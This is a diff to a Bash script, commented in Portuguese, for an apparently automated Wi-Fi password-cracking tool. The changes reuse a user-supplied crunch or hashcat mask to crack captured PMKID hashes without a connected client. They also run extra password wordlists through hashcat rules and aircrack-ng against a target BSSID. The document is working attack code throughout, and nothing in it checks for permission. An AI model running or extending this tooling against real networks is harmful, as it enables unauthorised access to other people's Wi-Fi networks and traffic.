@@ -41,6 +41,13 @@ IP_ROTEADOR=""
 SOMENTE_DADOS=0
 MONITOR_MODE_ATIVO=0   # controla o cleanup: só restaura se realmente entrou em modo monitor
 
+# Máscara informada na Rota A — reutilizada pela Rota D (PMKID) para quebrar
+# o hash capturado sem depender de handshake/cliente conectado.
+MASK_KIND=""     # "", "crunch" ou "hashcat"
+MASK_STR=""      # a máscara em si
+MASK_CUSTOM=""   # charset custom -1 (só hashcat)
+MASK_TAM=""      # tamanho min/max do crunch (só crunch)
+
 # ============================================================================
 # 1. LOG / UTILITÁRIOS
 # ============================================================================
@@ -565,6 +572,9 @@ rota_mascara() {
             ;;
     esac
 
+    # Guarda a máscara crunch para a Rota D (PMKID) reaproveitar se esta falhar.
+    MASK_KIND="crunch"; MASK_STR="$mascara"; MASK_TAM="$tamanho"; MASK_CUSTOM=""
+
     if [[ "$tamanho" -lt 8 ]]; then
         log "Aviso: WPA/WPA2 exige senha de 8+ caracteres — máscara de ${tamanho} dificilmente casa."
     fi
@@ -607,6 +617,9 @@ rota_mascara_hashcat() {
         return 1
     fi
     read -rp "Charset custom p/ ?1 (ex.: ?l?u?d; ENTER p/ pular): " custom
+
+    # Guarda a máscara hashcat para a Rota D (PMKID) reaproveitar se esta falhar.
+    MASK_KIND="hashcat"; MASK_STR="$mascara"; MASK_CUSTOM="$custom"; MASK_TAM=""
 
     if ! capturar_handshake; then
         return 1
@@ -652,6 +665,45 @@ rota_mascara_hashcat() {
     fi
 
     erro "Máscara hashcat não encontrou a senha com os parâmetros informados."
+    return 1
+}
+
+# Quebra um arquivo hc22000 usando a máscara guardada (MASK_*). Ecoa a senha
+# encontrada (ou nada) e retorna 0/1. Usada pela Rota D (PMKID) para quebrar
+# o hash sem depender de handshake. Usa GPU; repete com --force se "No devices".
+quebrar_hc22000_com_mascara() {
+    local hashfile="$1"
+    [[ -z "$MASK_KIND" ]] && return 1
+    [[ -s "$hashfile" ]] || return 1
+    command -v hashcat &>/dev/null || return 1
+
+    local found="${WORKDIR}/mask_found.txt"
+    local hc_out="${WORKDIR}/mask_hashcat.out"
+    rm -f "$found"
+
+    if [[ "$MASK_KIND" == "hashcat" ]]; then
+        local cf=(); [[ -n "$MASK_CUSTOM" ]] && cf=(-1 "$MASK_CUSTOM")
+        hashcat -m 22000 "$hashfile" -a 3 "${cf[@]}" "$MASK_STR" \
+            --potfile-disable -o "$found" >"$hc_out" 2>&1
+        if [[ ! -s "$found" ]] && grep -qiE "no devices? (found|left)" "$hc_out"; then
+            hashcat -m 22000 "$hashfile" -a 3 "${cf[@]}" "$MASK_STR" \
+                --force --potfile-disable -o "$found" >"$hc_out" 2>&1
+        fi
+    else
+        # crunch: gera os candidatos e manda pro hashcat via stdin
+        crunch "$MASK_TAM" "$MASK_TAM" -t "$MASK_STR" 2>>"$LOGFILE" \
+            | hashcat -m 22000 "$hashfile" --potfile-disable -o "$found" >"$hc_out" 2>&1
+        if [[ ! -s "$found" ]] && grep -qiE "no devices? (found|left)" "$hc_out"; then
+            crunch "$MASK_TAM" "$MASK_TAM" -t "$MASK_STR" 2>>"$LOGFILE" \
+                | hashcat -m 22000 "$hashfile" --force --potfile-disable -o "$found" >"$hc_out" 2>&1
+        fi
+    fi
+    cat "$hc_out" >> "$LOGFILE"
+
+    if [[ -s "$found" ]]; then
+        cut -d':' -f2- "$found" | tail -1
+        return 0
+    fi
     return 1
 }
 
@@ -800,6 +852,33 @@ rota_dicionario() {
         return 0
     fi
 
+    # Wordlists extras que o usuário tenha colocado em wordlists/ (ex.: lista
+    # de senhas comuns brasileiras), além do rockyou.
+    local wl
+    for wl in "${WORDLIST_DIR}"/*.txt; do
+        [[ -e "$wl" ]] || continue
+        [[ "$wl" == "${ROCKYOU}" ]] && continue
+        log "Tentando wordlist extra: $(basename "$wl")..."
+        if [[ -s "$hashfile" ]] && command -v hashcat &>/dev/null; then
+            rm -f "${WORKDIR}/hashcat_found.txt"
+            hashcat -m 22000 "$hashfile" "$wl" -r /usr/share/hashcat/rules/best64.rule \
+                --potfile-disable -o "${WORKDIR}/hashcat_found.txt" &>>"$LOGFILE"
+            if [[ -s "${WORKDIR}/hashcat_found.txt" ]]; then
+                SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/hashcat_found.txt" | tail -1)"
+                ROTA_USADA="Dicionário ($(basename "$wl") + best64)"
+                log "Senha encontrada via hashcat (wordlist extra): ${SENHA_ENCONTRADA}"
+                return 0
+            fi
+        fi
+        SENHA_ENCONTRADA="$(aircrack-ng -w "$wl" -b "${TARGET_BSSID}" "$cap" 2>>"$LOGFILE" \
+            | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"
+        if [[ -n "${SENHA_ENCONTRADA}" ]]; then
+            ROTA_USADA="Dicionário ($(basename "$wl"))"
+            log "Senha encontrada via aircrack-ng (wordlist extra): ${SENHA_ENCONTRADA}"
+            return 0
+        fi
+    done
+
     # Estimativa honesta de inviabilidade (brute-force fora de dicionário)
     echo
     echo ">>> Senha não encontrada no dicionário rockyou.txt + regras best64."
@@ -899,6 +978,21 @@ rota_pmkid() {
     if [[ ! -s "$pmkid_hash" ]]; then
         log "O roteador não respondeu com PMKID (comum em APs com WPA3/PMF). Rota D sem sucesso."
         return 1
+    fi
+
+    # Se o usuário informou uma máscara na Rota A, tenta ela no PMKID primeiro —
+    # assim dá pra quebrar SEM depender de cliente conectado (handshake).
+    if [[ -n "$MASK_KIND" ]]; then
+        log "PMKID capturado! Tentando quebrar com a máscara informada (${MASK_STR})..."
+        local senha_mask
+        senha_mask="$(quebrar_hc22000_com_mascara "$pmkid_hash")"
+        if [[ -n "$senha_mask" ]]; then
+            SENHA_ENCONTRADA="$senha_mask"
+            ROTA_USADA="PMKID + máscara"
+            log "Senha encontrada via PMKID + máscara: ${SENHA_ENCONTRADA}"
+            return 0
+        fi
+        log "Máscara não quebrou o PMKID. Tentando dicionário (rockyou)..."
     fi
 
     if [[ ! -s "${ROCKYOU}" ]]; then
